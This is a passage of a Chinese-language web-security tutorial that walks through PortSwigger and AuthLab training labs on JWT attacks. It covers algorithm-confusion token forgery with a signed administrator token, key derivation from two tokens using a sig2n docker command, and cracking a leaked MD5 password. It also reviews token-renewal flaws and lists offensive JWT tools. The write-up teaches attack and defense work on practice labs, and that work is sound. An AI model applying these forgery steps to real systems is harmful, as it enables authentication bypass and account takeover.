      "n": "zsiIsVqAKSpOnOxMKrI0hT3p8m_NK3VoejFnt4Hx2CFzvJsZ4_9mmoIVwi_nXYr7NtNV7stOSS4MGzYdJ57t4v83B9h7uI1fdKSp-L-cisg31S0Wm5B_LDnvuABFMcShJ-DKTgEYfLHaG31JudlyJdnfgNIIa0XL-wbGh7Xshf8RtzR8FC2DfApX_-KXYNnHxnTKTPXl5unBgCxyny2n2CwoCIiYet7s7X1c3qhwktWk6xJTmvkrd85KBlDSyEjBhEPPXrbVfqo8sNxkY-E2FXIoPIt8m_VSXlsKyZpjpfXTJJZo_IqazAl1XBW6bjwWjxwee0Xbyt7M1_1dTKjaAw"
}
```

[![](assets/1701606917-d06e5e480140c05ddeb2bb0266824394.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016145203-8361c4a0-6bf0-1.png)  
Step 6：选中"Copy Public Key as PEM"，同时将其进行base64编码操作，保存一下得到的字符串(备注:上下的一串-----END PUBLIC KEY-----不要删掉)

```plain
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAzsiIsVqAKSpOnOxMKrI0
hT3p8m/NK3VoejFnt4Hx2CFzvJsZ4/9mmoIVwi/nXYr7NtNV7stOSS4MGzYdJ57t
4v83B9h7uI1fdKSp+L+cisg31S0Wm5B/LDnvuABFMcShJ+DKTgEYfLHaG31Judly
JdnfgNIIa0XL+wbGh7Xshf8RtzR8FC2DfApX/+KXYNnHxnTKTPXl5unBgCxyny2n
2CwoCIiYet7s7X1c3qhwktWk6xJTmvkrd85KBlDSyEjBhEPPXrbVfqo8sNxkY+E2
FXIoPIt8m/VSXlsKyZpjpfXTJJZo/IqazAl1XBW6bjwWjxwee0Xbyt7M1/1dTKja
AwIDAQAB
-----END PUBLIC KEY-----
```

[![](assets/1701606917-501ff377eb631a3a1d7b803f656f526f.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016145233-9500c2d8-6bf0-1.png)  
base64后结果：

```plain
LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUF6c2lJc1ZxQUtTcE9uT3hNS3JJMApoVDNwOG0vTkszVm9lakZudDRIeDJDRnp2SnNaNC85bW1vSVZ3aS9uWFlyN050TlY3c3RPU1M0TUd6WWRKNTd0CjR2ODNCOWg3dUkxZmRLU3ArTCtjaXNnMzFTMFdtNUIvTERudnVBQkZNY1NoSitES1RnRVlmTEhhRzMxSnVkbHkKSmRuZmdOSUlhMFhMK3diR2g3WHNoZjhSdHpSOEZDMkRmQXBYLytLWFlObkh4blRLVFBYbDV1bkJnQ3h5bnkybgoyQ3dvQ0lpWWV0N3M3WDFjM3Fod2t0V2s2eEpUbXZrcmQ4NUtCbERTeUVqQmhFUFBYcmJWZnFvOHNOeGtZK0UyCkZYSW9QSXQ4bS9WU1hsc0t5WnBqcGZYVEpKWm8vSXFhekFsMVhCVzZiandXanh3ZWUwWGJ5dDdNMS8xZFRLamEKQXdJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg==
```

[![](assets/1701606917-df50cbd50fd9fc36b5d8ccbe5200b8b0.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016145255-a2a33092-6bf0-1.png)  
Step 7：在JWT Editor Keys处，生成新的对称加密Key，用之前保存的base64编码去替换k的值

```plain
{
    "kty": "oct",
    "kid": "63b7b785-4d35-4cb7-bbc6-9d9e17dcf5fe",
    "k": "LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUF6c2lJc1ZxQUtTcE9uT3hNS3JJMApoVDNwOG0vTkszVm9lakZudDRIeDJDRnp2SnNaNC85bW1vSVZ3aS9uWFlyN050TlY3c3RPU1M0TUd6WWRKNTd0CjR2ODNCOWg3dUkxZmRLU3ArTCtjaXNnMzFTMFdtNUIvTERudnVBQkZNY1NoSitES1RnRVlmTEhhRzMxSnVkbHkKSmRuZmdOSUlhMFhMK3diR2g3WHNoZjhSdHpSOEZDMkRmQXBYLytLWFlObkh4blRLVFBYbDV1bkJnQ3h5bnkybgoyQ3dvQ0lpWWV0N3M3WDFjM3Fod2t0V2s2eEpUbXZrcmQ4NUtCbERTeUVqQmhFUFBYcmJWZnFvOHNOeGtZK0UyCkZYSW9QSXQ4bS9WU1hsc0t5WnBqcGZYVEpKWm8vSXFhekFsMVhCVzZiandXanh3ZWUwWGJ5dDdNMS8xZFRLamEKQXdJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg=="
}
```

[![](assets/1701606917-b1dbb2d667c42fb119cb620a21fb9220.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016145321-b1e9487a-6bf0-1.png)  
Step 8：捕获请求数据报并将其发送到repeat模块  
[![](assets/1701606917-3caba85e34ea5558c531fad6ff50d02d.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016145338-bbcb4b0e-6bf0-1.png)  
此时直接请求/admin是无法请求到的  
[![](assets/1701606917-27ba793ffedf332acc81be68b53d5839.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016145355-c60c73e0-6bf0-1.png)  
Step 9：随后修改alg为HS256，修改sub为administrator并进行Sign操作  
[![](assets/1701606917-dd0f03cea81d7713cd135105da249808.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016145416-d2630082-6bf0-1.png)  
Step 10：重新发送数据包可以看到回显成功  
[![](assets/1701606917-31dfed3bdd65d6af95598d66c4933e84.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016145435-ddd489e0-6bf0-1.png)  
Step 11：请求敏感连接删除用户完成解题  
[![](assets/1701606917-71fe5998867d71e265e8dbc211550cb8.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016145451-e762780a-6bf0-1.png)  
[![](assets/1701606917-9f6c38af2a159d427ae87456242e227d.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016145502-ee1a855c-6bf0-1.png)

##### 令牌派生公钥

###### 基本介绍

在公钥不可用的情况下您仍然可以通过使用jwt \_ forgery.py之类的工具从一对现有的JWT中获取密钥来测试算法混淆，您可以在rsa\_sign2n GitHub存储库中找到几个有用的脚本  
[https://github.com/silentsignal/rsa\_sign2n](https://github.com/silentsignal/rsa_sign2n)

[![](assets/1701606917-c3a9345e60888a6a25c83c7a39cacbfd.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016145528-fd8b8d7e-6bf0-1.png)

###### 简易示例

靶场地址：  
[https://portswigger.net/web-security/jwt/algorithm-confusion/lab-jwt-authentication-bypass-via-algorithm-confusion-with-no-exposed-key](https://portswigger.net/web-security/jwt/algorithm-confusion/lab-jwt-authentication-bypass-via-algorithm-confusion-with-no-exposed-key)

[![](assets/1701606917-d7ac795f76ae40df4ca02f572cf96cc8.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016145550-0acd87a8-6bf1-1.png)  
Step 1：安装常规操作登录登出，再登录，获取两个JWT

[![](assets/1701606917-11e7617f184f19edfaaf8ec3d4c56b19.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016145605-139c8c1c-6bf1-1.png)  
随后将其放到Port提供的docker工具里面运行，运行的命令如下

```plain
docker run --rm -it portswigger/sig2n <token1> <token2>
```

[![](assets/1701606917-74ed76c811531b57ea697403490f7d1d.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016145630-22a031c8-6bf1-1.png)  
jwt \_ forgery.py脚本会输出一系列token的存在情况值

[![](assets/1701606917-dc5138e1d2ca65f2a6590fcdb50e436b.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016145650-2e5a8392-6bf1-1.png)

Step 2：这里我们尝试每一个Tempered JWT，Port这里给了提示说是X.509 形式的，所以我们只需要将X.509形式的JWT进行验证即可，当Response回应200时代表token是有效的，若为302则代表了重定向，下图是一个成功的案例  
[![](assets/1701606917-7ec4053111156d5e9e4d9d5c8e47cacc.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016145754-5471e02a-6bf1-1.png)  
Step 3：将JWT的Base64编码拿过来先放到记事本里面暂存，在Burpsuite的JWT Editor Keys点击New Symmetric Key，将上面的Base64编码拿过来替换此对称密钥的k值，生成对称密钥之后进行和之前攻击一致的Sign操作

[![](assets/1701606917-95788497b998453f71eb933cf88a1cff.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016145810-5e44b4c4-6bf1-1.png)

##### 敏感信息泄露

###### 基本介绍

JWT敏感信息泄露是指攻击者通过某种方式获取了JWT中包含的敏感信息，例如:用户的身份、权限或其他敏感数据，这种攻击可能会导致恶意用户冒充合法用户执行未经授权的操作或者访问敏感信息，常见的JWT敏感信息泄露方式包括：

*   窃取JWT：攻击者通过窃取JWT令牌来获取其中的敏感信息，这可以通过窃取存储在客户端的JWT令牌或者通过攻击服务器端的JWT签名算法来实现
*   窃取载荷：攻击者可以在传输过程中窃取JWT的载荷部分，这可以通过窃听网络流量或者拦截JWT令牌来实现
*   暴力破解：攻击者可以通过暴力破解JWT签名算法来获取JWT中包含的敏感信息

###### 简易示例

靶场地址：[https://authlab.digi.ninja/Leaky\_JWT](https://authlab.digi.ninja/Leaky_JWT)  
[![](assets/1701606917-086cfb7f44714bb843ae162ad0dcb12f.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016145855-78ca2bf8-6bf1-1.png)  
靶场JWT信息如上所示，而在实战中我们可以去抓包，如果抓到的数据包中有类似这样的JWT认证那我们就可以直接拿去解密了，我们拿到的数据是这样的：

```plain
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJsZXZlbCI6ImFkbWluIiwicGFzc3dvcmQiOiIyYWM5Y2I3ZGMwMmIzYzAwODNlYjcwODk4ZTU0OWI2MyIsInVzZXJuYW1lIjoiam9lIn0.6j3NrK-0C7K8gmaWeB9CCyZuQKfvVEAl4KhitRN2p5k
```

上面是一个标准的JWT认证的格式，其包含Header、Payload、Signature三个部分，每个部分之间又以"."号分割，他这里的JWT认证是经过base64加密的，所以我们这里先要拿到base64解密网站去解密一下  
[https://base64.us/](https://base64.us/)

[![](assets/1701606917-b4bb5d6d66ec101a98a41f56c7532627.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016145918-86c889de-6bf1-1.png)  
在这里我们可以看到payload部分的数据解密出来后包含password字段信息，后面解出来的是一串MD5数据，之后我们将其拿到MD5在线解密网站进行解密操作：  
[![](assets/1701606917-e607002ba217d1ef5757c3a2ea730aa1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016145933-8fa7a954-6bf1-1.png)  
随后得到密码Password1并使用其作为密码，使用joe作为用户名进行登录操作：  
[![](assets/1701606917-a072f463d5726c704621f34c4c1840fe.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016145949-99617826-6bf1-1.png)  
随后成功登录：'

[![](assets/1701606917-3b9ff9f47f55bec7837cc7b3f86ad2c8.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016150006-a2f41038-6bf1-1.png)

##### 密钥硬编码类

###### 基本介绍

JWT中的密钥是用于对令牌进行签名或加密的关键信息，在实现JWT时密钥通常存储在应用程序代码中即所谓的"硬编码"，这种做法可能会导致以下安全问题：

*   密钥泄露：硬编码的密钥可以被攻击者轻松地发现和窃取，从而导致JWT令牌被篡改或解密，进而导致安全漏洞
*   密钥管理：硬编码的密钥难以进行集中管理，无法灵活地进行密钥轮换、密钥失效等操作，从而增加了密钥管理的难度
*   密钥复用：硬编码的密钥可能会被多个应用程序或服务共享使用，这可能会导致一个应用程序出现安全漏洞后，其他应用程序也会受到影响

###### 漏洞案例

JWT密钥硬编码：

[![](assets/1701606917-a349484f8a25e7bb323e6844a8776355.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016150051-be12c9e0-6bf1-1.png)

#### 会话续期

##### 续期机制

JWT(JSON Web Token)的续期机制是指在JWT过期之后通过一定的方式来更新JWT令牌，使其可以继续使用以减少用户需要频繁重新登录的情况，常见的JWT续期机制包括：

*   刷新令牌(Refresh Token)：在用户登录时除了获取JWT令牌外还会获取一个刷新令牌，当JWT令牌过期时可以使用刷新令牌来获取新的JWT令牌，刷新令牌的有效期通常比JWT令牌长并且会在每次使用后更新有效期以确保安全性
*   延长有效期：在JWT令牌过期之前服务器可以根据某些条件来判断是否需要延长JWT令牌的有效期，例如:用户在活跃状态、令牌过期时间较短等，如果满足条件服务器将发送一个新的JWT令牌以替换原来的JWT令牌
*   自动续期：在使用JWT令牌时服务器可以检查JWT令牌的有效期并在需要时自动为其续期，这通常需要与前端应用程序进行配合以确保用户可以无缝地使用应用程序，而不需要重新登录

##### 续期问题

###### 无限使用

用户登录成功获取到一个JWT Token，JWT Token由包含算法信息的header和包含用户非敏感信息的body以及对header和body数据签名后的sing值拼接base64后生成，body中包含用户token失效时间戳exp(默认1小时)、用户id标识u  
[![](assets/1701606917-b2ef2561f21c1de35faacb186f1370a4.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016150210-ed2ef280-6bf1-1.png)  
JWT Token有效期为1小时  
[![](assets/1701606917-4f3b7c99a788548dd304adb4e0bc55b2.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016150231-f989c7ee-6bf1-1.png)

[![](assets/1701606917-f1c4ec22fb8afdb1941890dc39ed3959.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016150242-fff667c2-6bf1-1.png)

[![](assets/1701606917-455f8c58a37c037fe79d0a4626d04191.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016150250-050c7b8e-6bf2-1.png)  
但是在过期后发现使用之前过期的JWT Token可以继续进行会话操作  
[![](assets/1701606917-3593b662c8afd0d231622ae4b282bbf8.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016150335-1fad0210-6bf2-1.png)

###### Token刷新缺陷

JWT Token在续期设计时由于代码编写错误将新老token更新逻辑设计错误，使得新Token和老Token一致，导致JWT 续期失败  
[![](assets/1701606917-1dd60e92cce5a344427b395c57d3823b.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016150403-309a4af6-6bf2-1.png)  
测试效果如下：  
[![](assets/1701606917-e028aa15ea2d0ea6be8f7cabd9766580.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016150440-46cc78a8-6bf2-1.png)

###### N个新Token生成

功能测试时发现JWT Token首次生成时默认失效时120分钟，续期业务逻辑中仅在JWT Token的后1/3时间，也就是80-120分钟时进行续期操作，在此期间用户的Token会进行刷新操作，使用新的Token请求到服务器段，服务器端会返回一个新的JWT Token到前端，供前端使用，但是在续期期间旧的Token可以无限制生成多个有效的JWT Token，存在一定程度上的被利用风险  
[![](assets/1701606917-e2534c87ed08f863e80c35d674770081.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016150538-692e3d5a-6bf2-1.png)

[![](assets/1701606917-8519bd169af8a17e8bab0450a9e6b8f4.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016150608-7b263094-6bf2-1.png)

### 工具集合

#### jwt\_tool

##### 项目地址

[https://github.com/ticarpi/jwt\_tool](https://github.com/ticarpi/jwt_tool)

[![](assets/1701606917-da61248ec7181e13c4a944333eae8aad.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016150638-8d243f16-6bf2-1.png)

##### 主要功能

1、检查令牌的有效性  
2、测试已知漏洞：  
CVE-2015-2951：alg=none签名绕过漏洞  
CVE-2016-10555：RS / HS256公钥不匹配漏洞  
CVE-2018-0114：Key injection漏洞  
CVE-2019-20933 / CVE-2020-28637：Blank password漏洞  
CVE-2020-28042：Null signature漏洞  
3、扫描配置错误或已知漏洞  
4、Fuzz声明值以引发意外行为  
5、测试secret/key file/public key/ JWKS key的有效性  
6、通过高速字典攻击识别低强度key  
7、时间戳篡改  
8、RSA和ECDSA密钥生成和重建(来自JWKS文件)  
9、伪造新的令牌头和有效载荷内容，并使用密钥或通过其他攻击方法创建新的签名

###### 使用说明

[https://github.com/ticarpi/jwt\_tool/wiki/Using-jwt\_tool](https://github.com/ticarpi/jwt_tool/wiki/Using-jwt_tool)

[![](assets/1701606917-926f0f18aa5c4287f122c4c8ca55ac33.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016150702-9b20dd2c-6bf2-1.png)

#### MyJWT

##### 项目地址

[https://github.com/tyki6/MyJWT/](https://github.com/tyki6/MyJWT/)

[![](assets/1701606917-778a17001191eafe4a96d83924df5b69.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016150721-a65d5a4e-6bf2-1.png)

##### 功能说明

*   copy new jwt to clipboard
*   user Interface (thanks questionary)
*   color output
*   modify jwt (header/Payload)
*   None Vulnerability
*   RSA/HMAC confusion
*   Sign a jwt with key
*   Brute Force to guess key
*   crack jwt with regex to guess key
*   kid injection
*   Jku Bypass
*   X5u Bypass

#### 辅助脚本

##### 脚本地址

[https://gist.github.com/imparabl3/efcf4a991244b9f8f99ac39a7c8cfe6f](https://gist.github.com/imparabl3/efcf4a991244b9f8f99ac39a7c8cfe6f)

[![](assets/1701606917-8199e45f8ad08654bd9f89d93f11f3d8.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016150757-bc2263c4-6bf2-1.png)

##### 脚本功能

用于利用CRLF漏洞的脚本

### 参考链接

[https://1024tools.com/hmac](https://1024tools.com/hmac)  
[https://github.com/ticarpi/jwt\_tool](https://github.com/ticarpi/jwt_tool)  
[https://www.anquanke.com/post/id/236830](https://www.anquanke.com/post/id/236830)  
[https://www.freebuf.com/articles/web/337347.html](https://www.freebuf.com/articles/web/337347.html)  
[https://digi.ninja/projects/authlab.php#landleakyjwt](https://digi.ninja/projects/authlab.php#landleakyjwt)  
[https://attackdefense.com/challengedetails?cid=1424](https://attackdefense.com/challengedetails?cid=1424)  
[https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list](https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list)  
[https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-unverified-signature](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-unverified-signature)
